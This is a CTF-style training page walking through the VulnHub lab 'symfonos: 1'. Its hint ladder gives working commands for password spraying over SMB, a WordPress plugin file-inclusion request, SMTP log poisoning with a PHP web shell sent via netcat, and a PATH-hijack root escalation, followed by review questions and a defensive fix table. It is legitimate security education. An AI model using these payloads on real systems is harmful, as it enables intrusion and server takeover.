# Machine 12 — symfonos: 1

> **Position:** 12 of 13 · **Band 3 — Easy** (global rank **062** of 708)
> **Full writeup:** [`labs/3-062-symfonos-1/README.md`](../../labs/3-062-symfonos-1/README.md)

| | |
| --- | --- |
| **Machine** | symfonos: 1 |
| **Author** | Zayotic |
| **Released** | 29 June 2019 |
| **Target** | Debian — Samba 4.5.16, Apache 2.4.25, **Postfix on :25**, WordPress 5.2.2 |
| **VulnHub** | [entry/symfonos-1,322](https://vulnhub.com/entry/symfonos-1,322/) |
| **Estimated time** | 5–8 hours |

---

## Why this machine is here

Because it contains the most instructive **chained** attack in the path: **SMTP log
poisoning**. No single bug here gives you a shell. You need *three* separate
weaknesses to line up —

1. an **LFI** in a WordPress plugin,
2. a **Postfix mailbox that is world-readable and writable by mail**, and
3. the realisation that anything you can *write into a file the LFI can read* is
   code execution.

That is the moment LFI stops being "a file read" and becomes RCE, and it is a
pattern that recurs constantly in real PHP estates (mail spools, Apache access and
error logs, SSH auth logs, `/proc/self/environ`).

It also delivers the cleanest **PATH-hijack** escalation in the path: a SUID binary
in `/opt` that runs `curl` **by bare name**.

And its first step is a lovely piece of tradecraft: an anonymous SMB share contains a
memo listing **banned passwords** — which is, functionally, a **password list**.

## Learning objectives

1. Enumerate an **anonymous (null) SMB share** and read a leaked internal memo.
2. Understand how a "banned passwords" list is an **attack asset**, and use it to
   **spray** enumerated usernames.
3. Enumerate SMB users by **RID/SID** (`enum4linux`).
4. Set up a required **hostname** in `/etc/hosts` (`symfonos.local`).
5. Enumerate WordPress **plugins aggressively** and match them to public exploits.
6. Confirm and exploit **LFI** by reading `/etc/passwd`.
7. Perform **SMTP log poisoning** end to end and explain each link in the chain.
8. Read a **world-readable, unprotected Postfix mailbox**.
9. Escalate via **PATH hijack against a SUID binary that calls `curl` by bare name**.

## Attack classes covered

| Class | Where on this box |
| --- | --- |
| **Anonymous SMB share leaks a password policy** | `\\target\anonymous` → **`attention.txt`** |
| Policy list used as a **password list** | banned: `epidioko`, **`qwerty`**, `baseball` |
| SMB user enumeration by SID | `enum4linux -a` → `SYMFONOS\helios` (1000), `SYMFONOS\zeus` (1001) |
| **Weak / reused SMB password** | `helios` share via **`helios : qwerty`** |
| Hidden path disclosed | the share's notes reveal WordPress at **`/h3l105`** |
| Outdated vulnerable WordPress plugins | **`mail-masta 1.0`**, **`site-editor 1.1.1`** |
| **Local File Inclusion** | `…/mail-masta/inc/campaign/count_of_send.php?pl=` |
| **SMTP log poisoning → RCE** | PHP mailed to `helios` → `/var/mail/helios` → included via `pl=` |
| **Unprotected Postfix mailbox** | `/var/mail/helios` readable and writable |
| WordPress user enumeration | `/h3l105` → `admin` |
| **SUID binary calling a bare-name command** | `/opt/statuscheck` runs `curl -I http://localhost` |

## Read first

- [03 — Service and Network Attacks](../03-Service-and-Network-Attacks.md) **§2**
  (SMB) and **§3** (SMTP — including the log-poisoning payload, written for this box).
- [02 — Web Attacks](../02-Web-Attacks.md) **§5** (LFI, and the **RCE primitives**
  table — mail spool is one of them) and §7 (WordPress plugins).
- [05 — Linux Privilege Escalation](../05-Linux-Privilege-Escalation.md) **§7**
  (PATH hijacking) — read the whole section.
- [04 — Credentials and Cracking](../04-Credentials-and-Cracking.md) §3 (spraying).
- [06 — Shells, Persistence and Escapes](../06-Shells-Persistence-and-Escapes.md) §1–§2.

## Before you start — answer these

1. An internal memo says "these passwords are now BANNED". Why is that a gift to an
   attacker?
2. What is **password spraying**, and how is it different from a brute-force attack?
3. You have an LFI that can read any file. What must be true about a *second* file for
   you to get code execution?
4. Where does Postfix put a local user's mail, and who can write to it?
5. `/opt/statuscheck` runs `curl -I http://localhost`. Name the vulnerability without
   looking it up.

## Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

Ports **22, 25, 80, 139, 445**. Port **25** (SMTP) is unusual on a beginner box and
will matter much later — note it now and move on.

Start with SMB. Try **anonymous** access to *every* share. One of them needs no
credentials at all and contains a single text file.

Also: the site will want a **hostname**. Add it to `/etc/hosts`.
</details>

<details>
<summary><strong>Rung 2 — the memo and the share</strong></summary>

```bash
smbclient //TARGET/anonymous -N
smb: \> ls          # attention.txt
smb: \> get attention.txt
```
```text
A word to the wise...
All users are required to change their passwords.
The following passwords are now BANNED:
epidioko
qwerty
baseball
```

**A banned-password list is a password list.** Now get the usernames:

```bash
enum4linux -a TARGET
```
```text
S-1-5-21-...-1000 SYMFONOS\helios (Local User)
S-1-5-21-...-1001 SYMFONOS\zeus   (Local User)
```

Spray:

```bash
smbclient //TARGET/helios -U 'helios%qwerty'
```

Works. Inside are notes that reveal a **hidden WordPress path: `/h3l105`** and confirm
the host is `symfonos.local`. Add `TARGET symfonos.local` to `/etc/hosts` and browse
to `http://symfonos.local/h3l105/`.
</details>

<details>
<summary><strong>Rung 3 — the LFI</strong></summary>

```bash
wpscan --url http://symfonos.local/h3l105 --plugins-detection aggressive -e ap,u
```

→ plugins **`mail-masta 1.0`** and **`site-editor 1.1.1`**, both with public LFI
entries. Mail Masta's `count_of_send.php` includes a file named by `pl`:

```bash
curl "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

You can read **any file**. Now the key question: *which file can I **write** to?*

Port 25 is **Postfix**, and local mail is delivered to **`/var/mail/<user>`**.
</details>

<details>
<summary><strong>Rung 4 — SMTP log poisoning</strong></summary>

Mail PHP to `helios`. Postfix writes your message — including your PHP — into
`/var/mail/helios`:

```bash
nc TARGET 25
EHLO attacker
MAIL FROM: attacker@kali
RCPT TO: helios
DATA
<?php system($_GET['c']); ?>
.
QUIT
```

Then include the mailbox through the LFI and pass a command:

```bash
curl "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=id"
```

→ **RCE.** Get a real shell (check `which python` first, then use a Python reverse
shell through the `c=` parameter), and upgrade the TTY.

**Root:** `/opt/statuscheck` is SUID root and, per `strings`, runs
`curl -I http://localhost` — **bare name**:

```bash
cd /tmp
printf '/bin/sh -p\n' > curl
chmod +x curl
export PATH=/tmp:$PATH
/opt/statuscheck          # -> uid=0(root)
cat /root/proof.txt
```
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap -sC -sV -p-` → **22**, **25** (Postfix smtpd), **80**, **139**, **445**.
2. Anonymous SMB share → **`attention.txt`** → banned passwords `epidioko`,
   **`qwerty`**, `baseball` — i.e. a ready-made list.
3. `enum4linux -a` → users **`helios`**, **`zeus`**.
4. **Spray:** `smbclient //TARGET/helios -U 'helios%qwerty'` → the share's notes
   disclose the hidden WordPress path **`/h3l105`**.
5. `/etc/hosts` → `symfonos.local`; `wpscan … --plugins-detection aggressive -e ap,u`
   → **`mail-masta 1.0`**, **`site-editor 1.1.1`**.
6. **LFI** at `…/count_of_send.php?pl=/etc/passwd`.
7. **SMTP log poisoning:** mail `<?php system($_GET['c']); ?>` to `helios` on port 25
   → it lands in **`/var/mail/helios`** → include via `pl=/var/mail/helios&c=id` →
   **RCE** → reverse shell as `www-data` (some builds: `helios`).
8. **SUID `/opt/statuscheck`** calls `curl` by bare name → drop `/tmp/curl`
   containing `/bin/sh -p`, `export PATH=/tmp:$PATH` → **root** →
   **`/root/proof.txt`**.
</details>

## After you finish — review questions

1. Name the **three** independent weaknesses that had to combine for the RCE. Would
   any one of them alone have given you a shell?
2. Why is a "banned passwords" memo an attack asset rather than a defensive control?
   What should the memo have said instead?
3. You sprayed 2 usernames × 3 passwords = 6 attempts. How does that compare to a
   brute force in terms of detectability?
4. Besides the mail spool, name **three other files** an LFI could include to achieve
   code execution, and what you would have to write into each.
5. Why did the poisoned mail execute as PHP when Postfix stored it as plain text?
6. `strings /opt/statuscheck` revealed the bug in seconds. What else should you always
   run `strings` on, and what are you looking for?
7. Would this PATH hijack have worked if `sudo -l` had shown a `secure_path`? Explain.
8. The WordPress install was at `/h3l105`, not `/`. Did the obscure path add security?
   Why not?

## Defensive reflection

| Finding | Fix |
| --- | --- |
| **Anonymous SMB share** | Disable guest/anonymous access on every share; audit shares quarterly |
| Internal memo listing banned passwords | A banned list is a *hint list*. Distribute policy documents through authenticated channels only |
| `helios : qwerty` | Enforce complexity and length; check new passwords against a breached-password list; add lockout and rate limiting |
| SMB users enumerable by SID | Require SMB signing; restrict anonymous enumeration |
| **`mail-masta 1.0` / `site-editor 1.1.1` LFI** | Update or **remove** unused plugins. Subscribe to WPScan's vulnerability feed; block plugin paths at the WAF as a stopgap |
| `pl=` parameter reaching `include()` | Never build an include path from user input — use an allow-list of fixed keys |
| Hidden WordPress path `/h3l105` | Obscurity is not a control. Authenticate it or remove it |
| **Unprotected Postfix mailbox** | Restrict `/var/mail/*` permissions; disable the mailbox entirely if it is unused; consider `mail_spool_directory` hardening |
| SMTP open to the network | Bind Postfix to localhost or firewall port 25; it should not accept mail from arbitrary hosts |
| **SUID `/opt/statuscheck` calling `curl` by bare name** | Use **absolute paths** in privileged programs; set `secure_path` in `sudoers`; remove SUID if not required |
| WordPress user enumeration | Block `/?author=` and REST user endpoints |

**The single biggest lesson:** *an LFI plus any writable file equals remote code
execution.* Mail spools, web-server logs, auth logs, session files, `/tmp` — the list
of writable-and-includable files is long, and defenders routinely forget it.

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 11 — Photographer: 1](11-photographer-1.md) · next: [Machine 13 — HackInOS: 1](13-hackinos-1.md) · full writeup: [`labs/3-062-symfonos-1`](../../labs/3-062-symfonos-1/README.md)._
